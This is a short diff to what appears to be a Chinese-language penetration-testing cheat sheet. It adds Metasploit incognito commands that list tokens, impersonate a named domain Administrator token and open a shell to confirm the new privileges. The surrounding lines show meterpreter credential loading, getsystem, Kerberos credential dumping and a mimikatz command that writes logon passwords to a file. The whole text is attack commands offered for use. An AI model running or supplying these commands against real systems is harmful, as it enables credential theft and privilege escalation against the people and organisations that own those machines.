@@ -53,6 +53,15 @@ meterpreter > load kiwi  # 读取密码, 如果是64位的迁移到64位进程�
 meterpreter > getsystem
 meterpreter > creds_kerberos
 
+# msf incognito https://mp.weixin.qq.com/s/iPv5sT50orqW79SmbVaFEQ
+use incognito      //进入incognito模块
+list_tokens -u    //列出令牌
+impersonate_token "WUHANKQ\Administrator"    //选择要窃取的账号
+#验证权限
+shell          
+chcp 65001      //活动代码页字符为UTF-8编码
+whoami    
+
 # mimikatz
 mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords" "exit" > log.log
 
